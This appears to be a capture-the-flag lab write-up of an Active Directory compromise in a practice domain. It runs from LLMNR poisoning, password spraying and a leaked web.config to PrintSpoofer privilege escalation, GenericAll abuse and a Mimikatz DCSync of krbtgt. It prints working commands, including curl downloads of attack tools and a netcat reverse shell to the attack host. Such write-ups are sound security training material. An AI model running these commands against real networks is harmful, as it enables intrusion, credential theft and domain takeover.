Summary

Where Part I handed us a foothold, Part II starts with nothing but network access from an internal attack host and makes us earn our way in. The chain runs the full length of an AD compromise: LLMNR/NBT-NS poisoning to catch a hash, password spraying a weak policy for a second user, a leaked web.config exposing MSSQL credentials, PrintSpoofer abusing SeImpersonatePrivilege to reach SYSTEM, a GenericAll ACL over Domain Admins, and finally a DCSync of the krbtgt account.

💡 Environment

Attack host: PAR01 (172.16.7.240, dual-homed Parrot box)
Internal subnet: 172.16.7.0/23
Targets: DC01 (172.16.7.3), MS01 (172.16.7.50), SQL01 (172.16.7.60)
Key skills: LLMNR Poisoning, Password Spraying, MSSQL, PrintSpoofer, ACL Abuse, DCSync

// starting note

Connect to the internal attack host via SSH (or xfreerdp) and begin looking for a foothold into the domain.

LLMNR Poisoning for a Foothold

We start on the internal attack host with no credentials at all. First thing to notice is that the box is dual-homed: ens192 faces the 10.129.x.x side we came in on, and ens224 sits on the internal 172.16.7.0/23 domain network. That second interface is our way into the domain, so that's where we listen.

With no creds, the classic first move is to poison name-resolution traffic and catch an authentication hash. Responder does exactly that on the internal NIC.

bash: start Responder
$ sudo responder -I ens224
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]
[+] Listening for events...

After a short wait, a host starts resolving names we're happy to answer for.

responder: poisoned
[*] [MDNS] Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT.LOCAL
[*] [LLMNR] Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT
📊 Why This Works

Notice the requested name, INLANEFRIGHT, is a typo of INLANEFREIGHT. DNS fails on the misspelling, so the host falls back to broadcast name resolution (LLMNR/NBT-NS), and anyone on the segment can answer. We answer, the host authenticates to us, and we capture its NetNTLMv2 hash.

The captured hash lands in Responder's logs, with the account name at the very start.

bash: captured hash
$ cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.7.3.txt
AB***::INLANEFREIGHT:0c6498a2a4acd121:FC356D6ADC6D88DF90AC4AE7C5A81948:<...SNIP...>
🔑 First User

The username at the front of the capture answers the first objective, and the rest is a crackable NetNTLMv2 hash.

Cracking the Hash

If you're ever unsure what type of hash you're holding, hashid will tell you before you waste time on the wrong mode.

bash: identify
$ hashid 'AB***::INLANEFREIGHT:0c6498a2a4acd121:FC356D6ADC...'
[+] NetNTLMv2

It's NetNTLMv2, so we point John at the netNTLMv2 format and rockyou.

bash: crack
$ john --format=netNTLMv2 -w=/usr/share/wordlists/rockyou.txt AB920
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
we***           (AB***)
1g 0:00:00:00 DONE
Session completed.

The password falls instantly, giving us our first valid domain credential.

Mapping the Internal Network

Before using the credential we map the subnet. fping sweeps it quickly.

bash: fping sweep
$ fping -asgq 172.16.7.0/23
172.16.7.3
172.16.7.50
172.16.7.60
172.16.7.240

Four hosts (we're .240). An Nmap fingerprint of the other three sorts out their roles.

bash: nmap roles
$ nmap -A -Pn -T4 172.16.7.3 172.16.7.50 172.16.7.60 -p 445,135,3389
172.16.7.3   -> DC01   (445 open, signing required)
172.16.7.50  -> MS01   (3389 RDP open)
172.16.7.60  -> SQL01  (MSSQL 2019, port 1433)
📊 The Map
  • DC01 (172.16.7.3): domain controller, the endgame.
  • MS01 (172.16.7.50): RDP open, likely our first interactive access.
  • SQL01 (172.16.7.60): MSSQL 2019, a privilege-escalation surface for later.
  • PAR01 (172.16.7.240): our dual-homed attack host.

To reach these from our own tooling, an SSH dynamic tunnel plus proxychains lets us test the cracked credential against MS01.

bash: test creds via SOCKS
$ ssh -D 9050 htb-student@10.129.86.14        # SOCKS tunnel
$ proxychains4 nxc smb 172.16.7.50 -u AB*** -p we***
SMB  172.16.7.50  445  MS01  [+] INLANEFREIGHT.LOCAL\AB***:we***
// two tunnels, on purpose

I use the SSH SOCKS proxy for quick netexec checks, then bring up sshuttle separately for RDP so the graphical client routes transparently without wrapping it in proxychains. Different tools, different jobs.

The credential is valid on MS01. With sshuttle routing the subnet, we RDP in and read the first flag off the root of C.

bash: sshuttle + RDP
$ sshuttle -r htb-student@10.129.86.14 172.16.7.0/23 -v
c : Accept TCP: ... -> 172.16.7.50:3389.

$ xfreerdp /u:AB920 /p:weasal /v:172.16.7.50 +clipboard
cmd: flag
C:\>type flag.txt
aud1t_gr0u***

Password Spraying

Next objective: weak credentials for another user. The password policy decides whether spraying is safe, so we check it first. Building a user list over SMB and pulling net accounts:

powershell: password policy
PS> net accounts
Minimum password length:      1
Lockout threshold:            Never
Lockout duration (minutes):   30
⚠️ Lockout Threshold: Never

With no lockout threshold, we can spray as many guesses as we like without locking a single account. That's a green light, so I sprayed one likely password across the whole user list with kerbrute.

bash: kerbrute spray
$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 users.txt We******
[+] VALID LOGIN:  BR***@inlanefreight.local:W****
Done! Tested 2902 logins (1 successes) in 17.629 seconds
🔑 Second User

One hit out of 2902 attempts, a new user and password with zero risk of lockout. That username and password answer the next two objectives.

The Leaked web.config

New credentials mean new share access. Let's see what this user can reach.

bash: list shares
$ smbclient -L //172.16.7.3/ -U BR***
        Department Shares Disk    Share for department users
        NETLOGON          Disk    Logon server share
        SYSVOL            Disk    Logon server share

"Department Shares" is the interesting one. Rather than click through it by hand, spider it and let a module surface anything sensitive.

bash: spider
$ crackmapexec smb 172.16.7.3 -u BR*** -p W*** --share "Department Shares" -M spider_plus
$ cat /tmp/cme_spider_plus/172.16.7.3.json
"Department Shares": {
    "IT/Private/Development/web.config": { "size": "1.17 KB" }
}
📊 Why web.config Matters

A web.config in a readable share is a classic credential leak. These files routinely embed database connection strings in cleartext, exactly the kind of secret that shouldn't be world-readable on a share.

Downloading and reading it confirms it, an MSSQL connection string with a plaintext password.

xml: web.config
<connectionStrings>
  <add name="ConString"
       connectionString="...\SQLEXPRESS;Initial Catalog=Northwind;
       User ID=ne***;Password=D@********!"/>
</connectionStrings>
🔑 Database Credentials

The connection string hands us a database user and password for the SQL01 host, our route onto SQL01.

MSSQL to SYSTEM via PrintSpoofer

We authenticate to MSSQL with those credentials. A SQL shell is useful, but we want command execution on the host, so we enable xp_cmdshell.

SQL: enable xp_cmdshell
$ impacket-mssqlclient ne***:"D@*****"@172.16.7.60
SQL> enable_xp_cmdshell
SQL> reconfigure

With command execution, the first thing to check is the SQL service account's privileges.

SQL: whoami /priv
SQL> xp_cmdshell whoami /priv
SeImpersonatePrivilege   Impersonate a client after authentication   Enabled
SeCreateGlobalPrivilege  Create global objects                       Enabled
⚠️ SeImpersonatePrivilege

This one privilege is a direct path to SYSTEM. Tools in the "Potato" family (JuicyPotato, PrintSpoofer, RoguePotato) abuse it to impersonate a SYSTEM token. SQL service accounts almost always have it, which is why enabling xp_cmdshell so often means immediate SYSTEM.

I went with PrintSpoofer. Upload it plus a Netcat binary, start a listener, and trigger it.

SQL: stage the tools
SQL> xp_cmdshell "curl http://172.16.7.240:8000/PrintSpoofer64.exe -o C:\Windows\Temp\ps.exe"
SQL> xp_cmdshell "curl http://172.16.7.240:8000/nc.exe -o C:\Windows\Temp\nc.exe"
SQL: trigger PrintSpoofer
SQL> xp_cmdshell C:\Windows\Temp\ps.exe -c "C:\Windows\Temp\nc.exe 172.16.7.240 4443 -e cmd.exe"
[+] Found privilege: SeImpersonatePrivilege
[+] CreateProcessAsUser() OK
bash: SYSTEM shell
connect to [172.16.7.240] from 172.16.7.60
C:\Windows\system32>whoami
nt authority\system

C:\Users\Administrator\Desktop>type flag.txt
s3imp3rs****
🏆 SYSTEM on SQL01

PrintSpoofer turns that single impersonation privilege straight into a SYSTEM shell, and the flag on the Administrator desktop follows.

GenericAll over Domain Admins

Now we look for a user with GenericAll rights over the Domain Admins group. Running Inveigh locally as SYSTEM turned up nothing, so instead of waiting on poisoning we query the directory directly with PowerView.

powershell: find GenericAll
PS> Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs `
    | ? {$_.ActiveDirectoryRights -match "GenericAll"} `
    | select SecurityIdentifier, ActiveDirectoryRights

S-1-5-21-3327542485-274640656-2609762496-4611   GenericAll
S-1-5-18                                         GenericAll

S-1-5-18 is just SYSTEM, so the interesting one is that first SID. Resolving it to a name:

powershell: resolve SID
PS> ConvertFrom-Sid S-1-5-21-3327542485-274640656-2609762496-4611
INLANEFREIGHT\CT***
📊 What GenericAll Means

GenericAll over a group is full control of it. This user can add any account (including themselves) to Domain Admins, no exploit required, just a misconfigured ACL. We recover this user's password via a second Inveigh capture and crack it the same way as before.

With the credentials in hand, we run a shell as that user and use the ACL to reach into DC01.

powershell: abuse GenericAll
PS> runas /netonly /user:CT059 powershell.exe
PS> Net group "Domain Admins" ct059 /add /domain
PS> $cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\CT059', $pass1)
PS> Enter-PSSession -ComputerName DC01 -Credential $cred
[DC01]: PS C:\Users\CT059\Documents>
powershell: DC01 flag
[DC01]: PS C:\Users\Administrator\Desktop> cat .\flag.txt
acLs_*****

DCSync the krbtgt Hash

The final objective is the krbtgt NTLM hash. With Domain Admin access we DCSync it. I tried Mimikatz interactively first, but it hung in a loop, so I ran it as a one-liner: pass every command up front and exit at the end.

powershell: DCSync krbtgt
PS> .\mimikatz.exe "privilege::debug" `
    "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:krbtgt" "exit"

SAM Username         : krbtgt
Credentials:
  Hash NTLM: 7eba70412d81c1cd030d72a3e8dbe05f
🏆 Full Domain Compromise

The Hash NTLM line is the last flag. With the krbtgt hash the domain is owned durably, not just today: it's the key material behind Golden Ticket attacks, which forge arbitrary Kerberos tickets valid until krbtgt is rotated twice.

🎯 Key Takeaways

  • No creds? Poison for them: LLMNR/NBT-NS poisoning turns one mistyped hostname into a domain hash.
  • Weak policy is an open door: Lockout threshold: Never makes password spraying risk-free.
  • Config files leak secrets: a web.config in a readable share gave up a plaintext MSSQL connection string.
  • SeImpersonatePrivilege is game over: from a SQL service account, PrintSpoofer turns it straight into SYSTEM.
  • ACLs are the quiet path to DA: GenericAll over Domain Admins lets you add your own user in.
  • DCSync is the endgame: dumping the krbtgt hash means persistent, domain-wide control.
